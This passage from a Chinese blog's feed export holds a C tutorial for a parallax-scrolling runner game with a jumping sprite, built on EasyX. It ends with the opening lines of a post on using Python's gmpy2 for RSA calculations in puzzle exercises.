comment">//如果x轴，小于了窗口的宽度，那么X轴重新变为0</span><span class="token punctuation">&#123;</span>bgX<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//每次推图片的时候，序列都加一除以12取余，因为主角只有12个图片，11除以12取余还是11.</span>heroIndex <span class="token operator">=</span> <span class="token punctuation">(</span>heroIndex <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">12</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//渲染游戏背景</span><span class="token keyword">void</span> <span class="token function">updateBg</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//渲染背景,输出到坐标，不能使用PNG版本，会出BUG</span><span class="token function">putimagePNG2</span><span class="token punctuation">(</span>bgX<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>imgBgs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">putimagePNG2</span><span class="token punctuation">(</span>bgX<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>imgBgs<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">putimagePNG2</span><span class="token punctuation">(</span>bgX<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">330</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>imgBgs<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//循环展示背景</span><span class="token keyword">while</span> <span class="token punctuation">(</span>true<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//解决背景，闪烁的问题BeginBatchDraw和EndBatchDraw</span><span class="token function">BeginBatchDraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">updateBg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//推送玩家图像到屏幕</span><span class="token function">putimagePNG2</span><span class="token punctuation">(</span>heroX<span class="token punctuation">,</span>heroY<span class="token punctuation">,</span><span class="token operator">&amp;</span>imgHeros<span class="token punctuation">[</span>heroIndex<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">EndBatchDraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fly</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//帧等待30毫秒</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//暂停程序的运行，不然执行一次之后会直接退出</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行效果如下。</p><p><img src="/images/wordimage/2022/0306/run.png"></p><hr><h2 id="三-实现玩家跳跃"><a href="#三-实现玩家跳跃" class="headerlink" title="三.实现玩家跳跃"></a>三.实现玩家跳跃</h2><p>思路是，当我按下键盘的某个按键，比如空格，然后玩家里面就跳跃起来，怎么实现跳跃呢？，思路是让玩家人物的Y坐标自减，但是不能一直自减，如果一直自减，那么就会上天，所以自减到一定的位置之后，停止自减，这时候人物是悬空的，然后在让人物Y轴直接开始自增，自增就是下落，但是也不能一直自增需要定义一个量，自增到什么地方的时候就可以不用自增了。</p><p>首先定义一个函数，这个函数的作用是来判断键盘按下和判断是否为空格，_kbhit()函数的作用是判断键盘按下，如果按下就返回真。</p><p>然后_getch()函数是用来判断字符，无需回车，类似于scanf，scanf输入之后需要回车，然后120行，判断是否键盘为空格，如果是空格那么久执行jump函数。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">116</span><span class="token keyword">void</span> <span class="token function">KeyEvent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">117</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_kbhit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token number">118</span><span class="token keyword">char</span> ch<span class="token punctuation">;</span><span class="token number">119</span>ch <span class="token operator">=</span> <span class="token function">_getch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">120</span><span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">==</span> <span class="token char">' '</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">121</span><span class="token function">jump</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">122</span><span class="token punctuation">&#125;</span><span class="token number">123</span><span class="token punctuation">&#125;</span><span class="token number">124</span><span class="token number">125</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里想的是，定义一个开关来跳跃，当按下键盘的空格的时候开关打开，跳跃结束就关闭如下，然后还需要在init函数里面定义跳跃状态初始。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">27</span><span class="token comment">//定义玩家跳跃状态</span><span class="token number">28</span>bool heroJump<span class="token punctuation">;</span><span class="token number">65</span><span class="token comment">//初始玩家跳跃状态</span><span class="token number">66</span>heroJump <span class="token operator">=</span> false<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就可以在jump函数里面定义跳跃为真。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">112</span><span class="token keyword">void</span> <span class="token function">jump</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">113</span>heroJump <span class="token operator">=</span> true<span class="token punctuation">;</span><span class="token number">114</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>现在需要解决的另外一个问题是实现跳跃之后Y坐标自减，然后到了一定程度，就停止自减开始自增，然后又到一定程度停止自增，跳跃结束。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">31</span><span class="token comment">//定义最高跳跃高度;</span><span class="token number">32</span><span class="token keyword">int</span> heroJumpHightMax<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后在定义最高高度，思路是既然我们定义了人物高度，那么跳跃的时候比人物高度高多少个像素即可，如下让人物跳跃120个像素</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">69</span><span class="token comment">//定义最大跳跃高度,初始高度减去120就是跳跃的高度</span><span class="token number">70</span>heroJumpHightMax <span class="token operator">=</span> <span class="token number">345</span> <span class="token operator">-</span> imgHeros<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getheight</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">120</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后还需要定义跳跃的速度，不可能让人物瞬间跳跃瞬间下降吧，所以需要定义一个跳跃速度，让人物跳跃的时候一次减多少个像素，如下。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">29</span><span class="token comment">//定义玩家跳跃速度</span><span class="token number">30</span><span class="token keyword">int</span> heroJumpSpeed<span class="token punctuation">;</span><span class="token number">67</span><span class="token comment">//初始玩家跳跃速度</span><span class="token number">68</span>heroJumpSpeed <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后可以在fly函数里面执行动作了，如下代码，87行首先判断heroJump是否为真，如果为真，那么判断heroY是否小于最大高度，第一次判断肯定没有，所以就执行91行的自增，因为C语言，Y轴是反过来的，上面是负数，下面是正数。</p><p>所以就一直自增因为是反过来的所以必须要小于，当达到最大值的时候，重新赋值为4，正数，就是往下，但是不能一直往下，所以做了第二个判断，如果大于了图片原始高度，那么就是false重新赋值-4，下面else修改了一下，如果没有跳跃就反复循环图片。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">86</span><span class="token comment">//执行玩家跳跃</span><span class="token number">87</span><span class="token keyword">if</span> <span class="token punctuation">(</span>heroJump<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token number">88</span><span class="token keyword">if</span> <span class="token punctuation">(</span>heroY <span class="token operator">&lt;</span> heroJumpHightMax<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">89</span>heroJumpSpeed <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token number">90</span><span class="token punctuation">&#125;</span><span class="token number">91</span>heroY <span class="token operator">+=</span> heroJumpSpeed<span class="token punctuation">;</span><span class="token number">92</span><span class="token number">93</span><span class="token keyword">if</span> <span class="token punctuation">(</span>heroY <span class="token operator">></span> <span class="token number">345</span> <span class="token operator">-</span> imgHeros<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getheight</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">94</span><span class="token punctuation">&#123;</span><span class="token number">95</span>heroJump <span class="token operator">=</span> false<span class="token punctuation">;</span><span class="token number">96</span>heroJumpSpeed <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">;</span><span class="token number">97</span><span class="token punctuation">&#125;</span><span class="token number">98</span><span class="token punctuation">&#125;</span><span class="token number">99</span><span class="token keyword">else</span><span class="token number">100</span><span class="token punctuation">&#123;</span><span class="token number">101</span><span class="token comment">//每次推图片的时候，序列都加一除以12取余，因为主角只有12个图片，11除以12取余还是11.</span><span class="token number">102</span>heroIndex <span class="token operator">=</span> <span class="token punctuation">(</span>heroIndex <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">12</span><span class="token punctuation">;</span><span class="token number">103</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>全部代码如下👇。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_CRT_SECURE_NO_WARNINGS</span> <span class="token expression"><span class="token number">1</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;graphics.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"tools.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;conio.h></span></span><span class="token comment">//定义常量</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">WIN_WIDTH</span> <span class="token expression"><span class="token number">1012</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">WIN_HEIGHT</span> <span class="token expression"><span class="token number">396</span></span></span><span class="token comment">/*基于easyx搭建*/</span><span class="token comment">//背景图片</span>IMAGE imgBgs<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//背景图片x坐标</span><span class="token keyword">int</span> bgX<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//定义不同背景的速度</span><span class="token keyword">int</span> Bgspeed<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//定义主角图片对象</span>IMAGE imgHeros<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//定义玩家初始x轴和y轴</span><span class="token keyword">int</span> heroX<span class="token punctuation">;</span><span class="token keyword">int</span> heroY<span class="token punctuation">;</span><span class="token comment">//定义玩家初始帧</span><span class="token keyword">int</span> heroIndex<span class="token punctuation">;</span><span class="token comment">//定义玩家跳跃状态</span>bool heroJump<span class="token punctuation">;</span><span class="token comment">//定义玩家跳跃速度</span><span class="token keyword">int</span> heroJumpSpeed<span class="token punctuation">;</span><span class="token comment">//定义最高跳跃高度;</span><span class="token keyword">int</span> heroJumpHightMax<span class="token punctuation">;</span><span class="token comment">//游戏的初始化;</span><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//创建游戏窗口</span><span class="token function">initgraph</span><span class="token punctuation">(</span>WIN_WIDTH<span class="token punctuation">,</span> WIN_HEIGHT<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//加载背景资源</span><span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//res/bg001 ,res/bg002</span><span class="token comment">//sprintf将格式化的数据写入字符串</span><span class="token function">sprintf</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">"res/bg%03d.png"</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//loadimage加载图片</span><span class="token function">loadimage</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>imgBgs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//初始化背景x坐标</span>bgX<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//遍历加载主角资源,12张图片</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">12</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//加载主角图像资源</span><span class="token function">sprintf</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token string">"res/hero%d.png"</span><span class="token punctuation">,</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">loadimage</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>imgHeros<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//设置玩家初始位置</span>heroX <span class="token operator">=</span> WIN_WIDTH <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">-</span> imgHeros<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getwidth</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token comment">//定义玩家初始X轴</span>heroY <span class="token operator">=</span> <span class="token number">345</span> <span class="token operator">-</span> imgHeros<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getheight</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//初始玩家资源帧</span>heroIndex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//初始玩家跳跃状态</span>heroJump <span class="token operator">=</span> false<span class="token punctuation">;</span><span class="token comment">//初始玩家跳跃速度</span>heroJumpSpeed <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">;</span> <span class="token comment">//定义最大跳跃高度,初始高度减去120就是跳跃的高度</span>heroJumpHightMax <span class="token operator">=</span> <span class="token number">345</span> <span class="token operator">-</span> imgHeros<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getheight</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">120</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//定义不同背景移动速度 </span><span class="token keyword">void</span> <span class="token function">fly</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>bgX<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-=</span> Bgspeed<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//判断背景图片不够长，重新拼接图片</span><span class="token keyword">if</span> <span class="token punctuation">(</span>bgX<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token operator">-</span>WIN_WIDTH<span class="token punctuation">)</span><span class="token comment">//如果x轴，小于了窗口的宽度，那么X轴重新变为0</span><span class="token punctuation">&#123;</span>bgX<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//执行玩家跳跃</span><span class="token keyword">if</span> <span class="token punctuation">(</span>heroJump<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>heroY <span class="token operator">&lt;</span> heroJumpHightMax<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>heroJumpSpeed <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>heroY <span class="token operator">+=</span> heroJumpSpeed<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>heroY <span class="token operator">></span> <span class="token number">345</span> <span class="token operator">-</span> imgHeros<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getheight</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>heroJump <span class="token operator">=</span> false<span class="token punctuation">;</span>heroJumpSpeed <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token comment">//每次推图片的时候，序列都加一除以12取余，因为主角只有12个图片，11除以12取余还是11.</span>heroIndex <span class="token operator">=</span> <span class="token punctuation">(</span>heroIndex <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">12</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//渲染游戏背景</span><span class="token keyword">void</span> <span class="token function">updateBg</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//渲染背景,输出到坐标，不能使用PNG版本，会出BUG</span><span class="token function">putimagePNG2</span><span class="token punctuation">(</span>bgX<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>imgBgs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">putimagePNG2</span><span class="token punctuation">(</span>bgX<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>imgBgs<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">putimagePNG2</span><span class="token punctuation">(</span>bgX<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">330</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>imgBgs<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">jump</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>heroJump <span class="token operator">=</span> true<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//键盘操作</span><span class="token keyword">void</span> <span class="token function">keyEvent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span> ch<span class="token punctuation">;</span><span class="token comment">//_kbhit是检测是否键盘按下</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_kbhit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>ch <span class="token operator">=</span> <span class="token function">_getch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//判断是否按下的是空格，如果是那么执行jump函数</span><span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">==</span> <span class="token char">' '</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">jump</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//循环展示背景</span><span class="token keyword">while</span> <span class="token punctuation">(</span>true<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">keyEvent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//解决背景，闪烁的问题BeginBatchDraw和EndBatchDraw</span><span class="token function">BeginBatchDraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">updateBg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//推送玩家图像到屏幕</span><span class="token function">putimagePNG2</span><span class="token punctuation">(</span>heroX<span class="token punctuation">,</span>heroY<span class="token punctuation">,</span><span class="token operator">&amp;</span>imgHeros<span class="token punctuation">[</span>heroIndex<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">EndBatchDraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fly</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//帧等待30毫秒</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//暂停程序的运行，不然执行一次之后会直接退出</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四-优化帧等待"><a href="#四-优化帧等待" class="headerlink" title="四.优化帧等待"></a>四.优化帧等待</h2>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
            <tag> 游戏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python gmpy2模块解RSA</title>
      <link href="/2022/03fdd1ba45.html"/>
      <url>/2022/03fdd1ba45.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在做题的时候，发现，Python的gmpy2这个模块特别爽，写一篇文章，防止自己忘记</p><hr><h2 id="一-gmpy2模块RSA里面常用函数使用"><a href="#一-gmpy2模块RSA里面常用函数使用" class="headerlink" title="一.gmpy2模块RSA里面常用函数使用"></a>一.gmpy2模块RSA里面常用函数使用</h2><h3 id="1-求大整数x模m的逆元y"><a href="#1-求大整数x模m的逆元y" class="headerlink" title="1.求大整数x模m的逆元y"></a>1.求大整数x模m的逆元y</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-模幂运算"><a href="#2-模幂运算" class="headerlink" title="2.模幂运算"></a>2.模幂运算</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token comment">#求的是c的d次方modn</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以求d，如下详细代码。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token punctuation">,</span>binasciie <span class="token operator">=</span> <span class="token number">65537</span>p <span class="token operator">=</span> <span class="token number">104046835712664064779194734974271185635538927889880611929931939711001301561682270177931622974642789920918902563361293345434055764293612446888383912807143394009019803471816448923969637980671221111117965227402429634935481868701166522350570364727873283332371986860194245739423508566783663380619142431820861051179</span>q <span class="token operator">=</span> <span class="token 